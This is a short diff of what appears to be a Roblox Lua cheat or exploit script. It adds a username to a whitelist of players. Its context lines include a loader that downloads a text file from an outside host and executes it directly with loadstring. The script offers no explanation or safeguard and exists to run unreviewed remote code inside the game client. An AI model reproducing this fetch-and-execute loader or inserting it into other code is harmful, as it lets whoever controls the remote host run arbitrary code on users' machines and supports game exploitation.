@@ -16,7 +16,8 @@ local players = {
 	["Jairuspv5000"] = true,
 	["UraUraUrapro"] = true,
 	["firsttolast1312"] = true,
-	["TakeshiSendo132"] = true
+	["TakeshiSendo132"] = true,
+	["korn_234"] = true
 }
 local username = game.Players.LocalPlayer.Name
 local down = loadstring(game:HttpGet("http://testproj11234.ct8.pl/waredown.txt"))()
